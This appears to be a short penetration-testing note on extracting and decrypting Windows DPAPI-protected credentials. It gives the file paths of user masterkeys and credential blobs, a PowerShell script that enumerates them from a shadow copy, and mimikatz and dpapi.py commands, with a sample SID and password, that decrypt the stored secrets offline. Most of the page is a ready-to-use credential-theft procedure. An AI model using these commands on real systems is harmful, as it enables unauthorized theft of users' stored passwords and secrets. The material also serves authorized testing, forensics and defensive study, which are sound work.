# Decrypting DPAPI Credentials

pre-requirement: 
1. Target account masterkeys : `C:\Users\<useranme>\AppData\Roaming\Microsoft\Protect\*`
2. Target account secrets : `C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\*`
3. Target account sid, password / sha1 hash.

## Search Script

```powershell
$searchDir = "C:\VSS\Users"
$users = Get-ChildItem $searchDir
foreach ($user in $users) {
    " ========== $user - Master Key =========" ;
    $folders = Get-ChildItem -Directory -force "$searchDir\$user\AppData\Roaming\Microsoft\Protect\" -ErrorAction SilentlyContinue; 
	foreach ($folder in $folders) {
		"$searchDir\$user\AppData\Roaming\Microsoft\Protect\$folder"
		Get-ChildItem -force "$searchDir\$user\AppData\Roaming\Microsoft\Protect\$folder" -ErrorAction SilentlyContinue | foreach {$_.Fullname}
	}
	
	$folders = Get-ChildItem -Directory -force "$searchDir\$user\AppData\Local\Microsoft\Protect\" -ErrorAction SilentlyContinue
	foreach ($folder in $folders) {
		"$searchDir\$user\AppData\Local\Microsoft\Protect\$folder"
		Get-ChildItem -force "$searchDir\$user\AppData\Local\Microsoft\Protect\$folder" -ErrorAction SilentlyContinue | foreach {$_.Fullname}
	}
	
    " ========== $user - Secret =========" ;
	Get-ChildItem -force "$searchDir\$user\AppData\Roaming\Microsoft\Credentials" -ErrorAction SilentlyContinue | foreach {$_.Fullname}	
	
}
```

## Decrypt on other computer (windows)

1. Loading masterkey with `dpapi::masterkey` : `dpapi::masterkey /in:87790867-a883-4a2d-a467-019c315e1104 /sid:S-1-5-21-4124311166-4116374192-336467615-500 /password:P@ssw0rd`
2. Check if load success : `dpapi::cache`
3. Decrypt secret: `dpapi::cred /in:4A2EEB30EFC7958491B6578D9948EC7F`

## Decrypt on other computer (Linux)

1. Using `dpapi masterkey` to get key : `$ dpapi.py masterkey  -file <keyfile> -sid <userSid> -password <userPassword>`
2. Decrypt the key: `$ dpapi.py credential -file <encryptedFiles> -key <output in the first command>`
3. If the key match, it will return the value.

## Reference

+ https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey
+ https://otterhacker.github.io/Pentest/Techniques/DPAPI.html

